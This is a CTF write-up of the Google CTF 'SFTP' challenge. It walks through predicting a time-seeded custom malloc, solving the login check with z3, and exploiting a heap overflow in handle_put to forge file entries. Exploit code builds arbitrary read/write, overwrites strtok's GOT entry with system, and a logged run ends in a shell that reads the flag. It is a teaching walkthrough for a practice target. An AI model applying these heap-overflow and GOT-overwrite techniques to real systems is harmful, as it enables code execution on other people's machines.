### Summary

> This file server has a sophisticated malloc implementation designed to thwart traditional heap exploitation techniques...
> [sftp](https://github.com/str8outtaheap/heapwn/blob/master/GoogleCTF/SFTP/bin/sftp)

[Zjl](https://github.com/dimos) and I teamed up for SFTP. The challenge description refers to a sophisticated `malloc` implementation. Hence, the heap allocator is the first unit we inspect since all the basic operations of the binary manipulate the memory in the heap through `malloc`, `realloc` and `free`.
`malloc` returns a pseudo-random address within the boundaries of its "custom" heap:

```c
void init_heap()
{
  unsigned int v0;

  if ( mmap((void *)0x40000000, 0x200FFFFFuLL, 3, 50, -1, 0LL) != (void *)0x40000000 )
    abort();
  v0 = time(0LL);
  srand(v0);
}
```

`realloc` and `free` don't affect in any way the heap state as well as the exploitation phase and thus we'll not expand on it any further. There is not any sort of "book keeping" management in terms of which chunks should be returned back to the user (such as `main_arena` in glibc malloc). This means that the address of a new chunk depends solely on the random value `malloc` returns and the current state of the heap is not taken into account at all.

This way of heap organization does not guarantee the independence of the chunks and increases the risk of allocating at least two overlapping chunks. We take advantage of this fact in order to overflow an allocated chunk and achieve arbitrary read/write. For a successful exploitation, we should be able to calculate with some degree of precision when and where the overlapping chunks occur.

`malloc` generates random addresses by manipulating the pseudo-random values returned by the `rand` function, such that the final address is within the heap boundaries.

```c
int malloc(size) {
  return rand() & 0x1FFFFFFF | 0x40000000;
}
```

We notice that in each run of the program, the `rand` function of glibc is initialized with the seed `time(NULL)`, which can be easily predicted. Due to the deterministic behavior of the [PRNG](https://en.wikipedia.org/wiki/Pseudorandom_number_generator) used by libc, the generation of pseudo-random values depends exclusively on the seed. So once we know the seed, we are able to predict the address of each subsequent allocation and we can figure out when and where the overlap of chunks will take place.

### Login Authentication

Before we get into the bug hunting process, we had to authenticate. The provided password had to satifty the following:

```c
  magic = 0x5417;
  do
  {
    curr_byte ^= magic;
    ++password;
    magic = 2 * curr_byte;
    curr_byte = *password;
  }
  while ( curr_byte );
  result = 1LL;
  if ( magic != 0x8DFAu )
    result = 0;
  return result;
```

Which can be implemented in [z3](https://github.com/Z3Prover/z3) in the following manner:

```python
from z3 import *

def find_password(length):
        s = Solver()
        password = []
        
        for i in range(length):
                password.append(BitVec('c%d' % i, 8))
                s.add(Or(
                        And(password[i] > 0x40, password[i] < 0x5b),
                        And(password[i] > 0x60, password[i] < 0x7b)
                ))
        _hash = BitVecVal(0x5417, 16)
        
        for i in range(length):
                _hash = SignExt(8, password[i]) ^ _hash
                _hash = _hash * 2
        s.add(_hash == 0x8dfa)
        
        if s.check() == sat:
                m = s.model()
                result = ""
                for i in range(length):
                        obj = password[i]
                        c = m[obj].as_long()
                        result += chr(c)
                print result

for i in range(1, 15+1):
        find_password(i)

```

Our solver dumps the below password combinations.
```
APapy
rjpxppphm
GAcpphpypy
ahapppppypy
ihhabpxppypy
ahppabpxppypy
aahphabpxppypy
aabhHpabpxppypy
```

Once we're in, we're presented with an `sftp>` prompt and by typing `help` we get a list with all the available commands.

```
sftp> help
Available commands:
bye                                Quit sftp
cd path                            Change remote directory to 'path'
get remote                         Download file
ls [path]                          Display remote directory listing
mkdir path                         Create remote directory
put local                          Upload file
pwd                                Display remote working directory
quit                               Quit sftp
rm path                            Delete remote file
rmdir path                         Remove remote directory
symlink oldpath newpath            Symlink remote file
```

We could also take a peak at the [source code](https://github.com/str8outtaheap/heapwn/blob/master/GoogleCTF/SFTP/src/sftp.c) which was in `src/` and we can retrieve it via the `get src/sftp.c` command. Before we dive into the commands that led to the flag, let's have a quick rundown of the implemented data structures that build up the filesystem:

```c
typedef struct entry entry;
typedef struct directory_entry directory_entry;
typedef struct file_entry file_entry;
typedef struct link_entry link_entry;
typedef struct link_table_entry link_table_entry;

enum entry_type {
  INVALID_ENTRY        = 0x0,
  DIRECTORY_ENTRY      = 0x1,
  FILE_ENTRY           = 0x2,
  LINK_ENTRY           = 0x4,
  DIRECTORY_LINK_ENTRY = DIRECTORY_ENTRY | LINK_ENTRY,
  FILE_LINK_ENTRY      = FILE_ENTRY | LINK_ENTRY,
};

struct entry {
  struct directory_entry* parent_directory;
  enum entry_type type;
  char name[name_max];
};

struct directory_entry {
  struct entry entry;
  size_t child_count;
  struct entry* child[];
};

struct file_entry {
  struct entry entry;
  size_t size;
  char* data;
};

struct link_entry {
  struct entry entry;
  struct entry* target;
};

directory_entry* root = NULL;
directory_entry* pwd = NULL;
```

The filesystem has a tree-like structure. For example, if we were to make a directory called `dummy` and a file called `afile` in it, the filesystem, with `root` being its `/home` node, it'd look like this:


```
                            home
                            /\  \
                           /  \  \
                          /    \  \
                        flag  src dummy
                               /    \
                              /      \
                             /        \
                          sftp.c     afile
```

If this view isn't enough, have no fear, during the exploitation analysis we'll inspect the memory field-by-field.

### Bug Hunting

After playing around with the commands, it was pretty clear that either `ls` or `get` would be the ones from which we'd have to get an info leak since they both display user-driven data, by either printing file/directory names or printing a file's content.


```
sftp> ls
flag
src
sftp> mkdir adir
sftp> ls
flag
src
adir
sftp> cd adir
sftp> ls
sftp> put afile
3
AA
sftp> get afile
3
AA
sftp>
```

### Heap Overflow

There were two (maybe more) heap overflows on the service. One via `strcpy` when calling `new_entry` and one in `handle_put`. We used the latter to get r/w primitive and finally RCE. The core reason for that decision was because of the fact that `handle_put`, which is called when we want to create a new file, reads in the file contents via `fread`, which conveniently enough **doesn't null terminate** and doesn't stop "copying" once a null byte is met. This is pretty handy for us in order to craft fake `file_entry` objects on the heap for our r/w primitives.

```c
bool handle_put(char* path) {
  file_entry* file = NULL;
  entry* existing_entry = find_entry(path);
  if (existing_entry) {
    file = find_file(path);
  } else {
    file = new_file(path);
  }

  if (file) {
    char input_line[16];
    if (fgets(input_line, sizeof(input_line), stdin)) {
      size_t size;
      sscanf(input_line, "%zu", &size);
      if (file->size < size && size <= file_max) { // file_max is 65535
        file->data = malloc(size); // we want to reach this codepath
        file->size = size;
      } else if (file->size >= size) {
        memset(file->data, 0, size);
        file->size = size;
      } else {
        file->data = NULL;
        file->size = 0;
      }
      readn(file->data, file->size); // heap overflow
    }
  } else {
    printf("remote open(\"%s\"): No such file or directory\n", path);
  }

  return true;
}
```

`handle_put` starts off by checking if the file exists or not. If it doesn't, it'll call `new_file`:

```c
file_entry* new_file(char* path) {
  file_entry* file = NULL;
  entry** child = new_entry(path);

  file = realloc(*child, sizeof(file_entry));
  file->entry.type = FILE_ENTRY;
  file->size = 0;

  return file;
}
```

`new_file` just initializes the `file_entry` object. Now let's look carefully at `handle_put`. Whether the file exists or not, it'll prompt us to enter a size for the file's content/data. We want to fall under this case:

```c
if (file->size < size && size <= file_max) { // file_max is 65535
        file->data = malloc(size); // we want to reach this codepath
        file->size = size;

  [...]
}
readn(file->data, file->size); // heap overflow
```

`file_max` is `65535`. As long we enter a size less than or equal to `65535`, we're good to go and `readn` will be invoked.

```c
void readn(char* buf, size_t buf_len) {
  while (buf_len) {
    int result = fread(buf, 1, buf_len, stdin);
    if (result < 0) {
      abort();
    }
    buf += result;
    buf_len -= result;
  }
}
```

After the recon phase, it's time to map out a plan for an arbitrary R/W primitive.

### Chunk Overlap

As was previously mentioned, the goal is to reliably estimate two chunks whose addresses overlap. To be more precise, it'd be really sweet if we could land a `file_entry->data` pointer before a `file_entry` object. If the difference of these two chunks is less than `file_max` and the `file_entry->data` address is preceded, we are able to overwrite the contents of a `file_entry` object while writing `file_max` bytes in the data chunk.

**Note:** _For clarity's sake, from now on we'll be referring to the `data` chunk as `magic` and the `file_entry` object which is to be overwritten as `victim`._

At this point, we can calculate the number of required chunks to allocate until `malloc` returns two overlapping chunks. Each time we'll allocate 100 chunks and calculate the minimum difference between every two chunks.

```python
chunks = []

# Every 100th allocation, take the chunks, sort them
# and find the two with the minimum difference
def find_min_diff():
        global chunks
        global heap_allocations

        chunks.sort()

        min_diff = 0x60100000 - 0x40000000 + 1
        pos = None

        for i in range(len(chunks) - 1):
                diff = chunks[i + 1][0] - chunks[i][0]
                if diff < min_diff:
                        min_diff = diff
                        pos = i
        return (pos, min_diff)
```

We continue the allocations until we find two chunks whose address difference is less than `file_max`.

```python
file_max_size = 65535

while not magic_chunk:
        for i in range(100):
                addr = malloc()
                chunks.append((addr, allocations_count))

        pos, padlen = find_min_diff()
        if pos and padlen <= file_max_size - 0x30:
            # magic_chunk will be used to overflow through victim
                magic_chunk =  {
                  'addr' : chunks[pos][0],
                  'allocs_needed' : chunks[pos][1]
        }
        # victim file entry whose data pointer we will overwrite
        # in order to get r/w prims
                victim =  {
                  'addr' : chunks[pos + 1][0],
                  'allocs_needed' : chunks[pos + 1][1]
        }

        break
```

Once we find the `magic` and `victim` chunks, we note down each of their addresses as well as the number of allocations needed for each one of them.

It's time to allocate the exact number of entries on the actual program until `magic` and `victim` are allocated . We use a helper function `make_file_entries` which creates empty file entries (each of those requires one allocation) in the heap. We do that in order to avoid unnecessary file content/data allocations which will result in a cleaner heap state.

```python
def make_file_entries(n):
    # Make file entries until |n| number of entries
    global entries

    for _ in range(entries, n):
        put('file_%d' % entries, 0, '')
```

At this point, the heap contains only file entries without a data pointer. Then, we call `put` and make a new file with content size `file_max` bytes.  This causes the allocation of a new `file_entry` structure with `magic` as its data pointer and finally the allocation of the long-awaited `magic` itself.

```python
# allocate enough files before the magic_chunk
make_file_entries(magic_chunk['allocs_needed'] - 2)
# allocate magic_chunk
put('magic', file_max_size, 'A' * file_max_size)
```

Whether the victim is allocated after or before `magic`, it doesn't really matter. In the first case, we keep creating enough file entries until we reach `victim`, while in the latter case, `magic` has practically already overlapped with `victim`.

```python
# allocate victim / file entry
make_file_entries(victim['allocs_needed'])
```

```
0x4994b45a:	0x4141414141414141	0x4141414141414141 _ _ _ _ _
0x4994b46a:	0x4141414141414141	0x4141414141414141            \
0x4994b47a:	0x4141414141414141	0x4141414141414141             \
0x4994b48a:	0x4141414141414141	0x4141414141414141              \
0x4994b49a:	0x4141414141414141	0x4141414141414141                 magic
0x4994b4aa:	0x4141414141414141	0x4141414141414141              /
0x4994b4ba:	0x4141414141414141	0x4141414141414141             /
0x4994b4ca:	0x4141414141414141	0x4141414141414141 _ _ _ _ _  /          
    .
    .
    .
0x4994b88c:	0x4141414141414141	0x4141414141414141
0x4994b89c:	0x4141414141414141	0x4141414141414141
                    |parent|            |name| | |type|
0x4994b8ac:	0x0000000054785b4c	0x656c696600000002 _ _ _ _ _ _
0x4994b8bc:	0x414141410030375f	0x4141414141414141             \
                      |size|                |data ptr|                    (struct file_entry)victim
0x4994b8cc:	0x0000000000000000	0x4141414141414141 _ _ _ _ _ _ /
```

### Arbitrary R/W

Now that we've successfully gained control over `victim`, we can overwrite its structure fields, such as the `size` and `data`.

```python
def craft_file_entry(size, addr):
    data = 'A' * padlen
    file_entry   = p64(0xc01db33f)            # entry.parent_directory
    file_entry += p32(FILE_ENTRY_TYPE)       # entry.type
    file_entry += 'victim'.ljust(20, '\x00') # entry.name
    file_entry += p64(size)                  # size
    file_entry += p64(addr)                  # data
    file_entry = file_entry.ljust(file_max_size, '\x00')

    put('magic', file_max_size, data + file_entry)
```

Using the `get` command with `victim` as its argument, we can leak `size` bytes from `victim`'s `data` pointer.

```python
def leak(addr, size):
    craft_file_entry(size, addr)
    return get('victim')
```

First step after gaining control over the `data` pointer is to leak the binary's base address. Knowing that `c01db33f` has `/home` (located at `.bss`) as its parent directory field,  we can use the `leak` function to leak `c01db33f`'s `parent_directory` field and find its corresponding PIE address.

```python
# The very first entry is stored in the bss while the
# and its childs on the heap
home_entry_addr = u64(leak(root_entry, 8))
pie_base = home_entry_addr - 0x208be0
```

```
                     |parent|            |name| | |type|
0x4994b8ac:	0x00000000c01db33f	0x0000006200000002 _ _ _ _ _ _
0x4994b8bc:	0x0000000000000000	0x0000000000000000             \
                      |size|                  |data|                      (struct file_entry)victim
0x4994b8cc:	0x0000000000000008	0x0000000054785b4c _ _ _ _ _ _ /
       _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ |
     /
     |          |parent_directory|       |name| | |type|
0x54785b4c:	0x000055f597a98be0	0x6431306300000001 _ _ _ _ _ _ 
0x54785b5c:	0x0000000066333362	0x0000000000000000             \
                   |child_count|         |entry* child[]|                 (struct directory_entry)c01db33f
0x54785b6c:	0x0000000000000080	0x000000005f1a20d4 _ _ _ _ _ _ /
```

```
gdb-peda$ x/s 0x0000000054785b4c+0xc
0x54785b58:	"c01db33f"

gdb-peda$ x/s 0x000055f597a98be0+0xc
0x55f597a98bec:	"home"
```

```
                |parent_directory|       |name| | |type|
0x55f597a98be0:	0x0000000000000000	0x656d6f6800000000 _ _ _ _ _ _
0x55f597a98bf0:	0x0000000000000000	0x0000000000000000             \ 
                   |child_count|         |entry* child[]|                 (struct directory_entry)home
0x55f597a98c00:	0x0000000000000001	0x0000000054785b4c _ _ _ _ _ _ /
```

Using the `put` command with `victim` as its argument, we can write `size` bytes at the location where `victim`'s data pointer points to.

```python
def write(what, where):
    craft_file_entry(len(what), where)
    put('victim', len(what), what)
```

We use the `leak` function to resolve remote symbols of `glibc` without the knowledge of its version. This functionality has already been implemented in [pwntools](https://github.com/Gallopsled/pwntools) library with the [DynELF](http://docs.pwntools.com/en/stable/dynelf.html) module. The `DynELF` module, having knowledge of how the dynamic linker looks up symbols in the internal hash tables of the binary, can calculate the [bucket](https://blogs.oracle.com/solaris/gnu-hash-elf-sections-v2) in which there will be information about the address of a symbol (in our case `system`).

```python
leak8 = lambda x: leak(x, 8)

with context.quiet:
    dynelf = DynELF(leak8, pie_base, elf=ELF('./sftp'))
    system = dynelf.lookup('system', 'libc')
```

The last step is to find a function, which is called with a user-controlled argument. Then, we can write the `system` address into its GOT entry since RELRO is not set to FULL.. We choose `strtok` for this purpose and we achieve a call to this function with the `mkdir` command.

```
                     |parent|            |name| | |type|
0x4994b8ac:	0x00000000c01db33f	0x0000006200000002 _ _ _ _ _ _
0x4994b8bc:	0x0000000000000000	0x0000000000000000             \
                      |size|                  |data|                      (struct file_entry)victim
0x4994b8cc:	0x0000000000000008	0x000055f597a950c0 _ _ _ _ _ _ /
```

```
gdb-peda$ x/gx 0x000055f597a950c0
0x55f597a950c0:	0x00007fb5b6770660
gdb-peda$ p strtok
$9 = {<text variable, no debug info>} 0x7fb5b6770660 <strtok>
```

```python
strtok_got = pie_base + 0x2050c0
write(p64(system), strtok_got)
```

```
gdb-peda$ x/gx 0x55f597a950c0
0x55f597a950c0:	0x00007fb5b6727390
gdb-peda$ p system
$11 = {<text variable, no debug info>} 0x7fb5b6727390 <__libc_system>
```

```
[+] Opening connection to sftp.ctfcompetition.com on port 1337: Done
[*] Paused (press any to continue)
[*] root entry   => 0x5c3d1ee5
[+] magic chunk  => 0x5d6c2342 (67th allocation)
[+] victim chunk => 0x5d6c691b (37th allocation)
[*] diff is 17881 bytes
[+] Setting up file entries: done
[+] PIE base address => 0x5600b26dd000
[+] system address => 0x7fc609926390
[*] Switching to interactive mode
$ id
uid=1337(user) gid=1337(user) groups=1337(user)
$ cat /home/user/flag
CTF{Moar_Randomz_Moar_Mitigatez!}
```
